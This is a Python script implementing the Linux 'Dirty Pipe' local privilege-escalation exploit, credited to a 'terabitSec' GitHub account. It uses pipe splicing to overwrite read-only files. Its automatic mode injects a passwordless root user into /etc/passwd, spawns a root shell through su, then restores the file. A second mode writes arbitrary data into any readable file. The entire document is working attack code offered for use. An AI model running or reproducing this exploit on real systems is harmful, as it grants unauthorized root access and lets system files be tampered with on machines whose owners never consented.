import os, sys, argparse, fcntl

PAGE_SIZE = 4096


def preparePipe():
    r, w = os.pipe() 
    pipeSize = fcntl.fcntl(w, fcntl.F_GETPIPE_SZ)

    buffer = bytes(4096)
    i = 0
    while i < pipeSize/PAGE_SIZE:
        os.write(w, buffer)
        i += 1
    
    i = 0
    while i < pipeSize/PAGE_SIZE:
        os.read(r, len(buffer))
        i += 1
    
    return w


def exploit(fi, offset, data):
    try:
        f = os.open(fi, os.O_RDONLY)
        lenF = len(open(fi).read())
    except FileNotFoundError:
        print("Couldn't open file.")
        return 1
    

    if offset % PAGE_SIZE == 0:
        print('Sorry, cannot start writing at a page boundary.')
        return 1
    
    nextPage = (offset | (PAGE_SIZE - 1)) + 1
    endOffset = offset + len(data)

    if endOffset > nextPage:
        print("Sorry, cannot write accross a page bondary")
        return 1
    
    if offset > lenF:
        print("Sorry, offset is not inside the file.")
        return 1
    
    if endOffset > lenF:
        print("Sorry, cannot enlarge the file")
        return 1

    w = preparePipe()
    os.splice(f, w, offset)
    os.write(w, data.encode())

    return 0


def automaticRoot():
    passwdCopy = open('/etc/passwd', 'r').readlines()[:10]
    
    offset = 0
    for i in range(5):
        offset += len(passwdCopy[i])

    originalLogin = passwdCopy[5]
    originalLoginLength = len(originalLogin)
    spoofLogin = "terabitSec::0:0::/:/bin/sh"
    spoofedLoginLength = len(spoofLogin)
    spoofLogin += '\00' * ((originalLoginLength - spoofedLoginLength) - 1)

    print("[+] hjacking super user in /etc/passwd")
    exploit('/etc/passwd', offset, f'{spoofLogin}\n')

    print("[+] dropping shell")
    if os.system('/bin/su terabitSec') != 0:
        print("[!] couldn't spawn root shell with /bin/su binary")
    
    print("[+] restoring original user in /etc/passwd")
    exploit('/etc/passwd', offset, f'{originalLogin}')

    return 0


def main():
    parser = argparse.ArgumentParser(epilog="An offering of https://github.com/terabitSec.")
    group = parser.add_mutually_exclusive_group()
    group.add_argument('-a', '--automatic', action='store_true', help="Try automatic root by hjacking an super user.")
    group.add_argument('-w', '--writeFile', nargs=3, metavar=('FILE', 'OFFSET', 'DATA'), help="Use dirty pipe exploit to write a file you can read.")

    args = parser.parse_args()

    if args.automatic:
        automaticRoot()
    elif args.writeFile:
        f, offset, data = args.writeFile
        exploitRun = exploit(f, int(offset), data)
    else:
        parser.print_help()
    

main()